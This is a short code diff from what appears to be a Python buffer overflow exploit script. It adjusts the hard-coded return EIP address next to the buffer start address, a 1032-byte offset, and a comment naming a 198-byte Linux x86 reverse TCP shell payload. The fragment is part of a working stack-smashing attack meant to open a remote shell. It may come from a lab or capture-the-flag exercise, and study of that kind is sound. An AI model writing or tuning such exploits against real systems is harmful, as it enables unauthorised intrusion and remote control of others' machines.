@@ -4,7 +4,7 @@ import sys
 
 # constants
 buffer_start_addr_little_endian = b"\xa4\xf6\xff\xbf"
-return_eip_addr_little_endian = b"\xc4\xf6\xff\xbf"
+return_eip_addr_little_endian = b"\x84\xf7\xff\xbf"
 offset = 1032
 
 # linux/x86/shell_reverse_tcp - 198 bytes
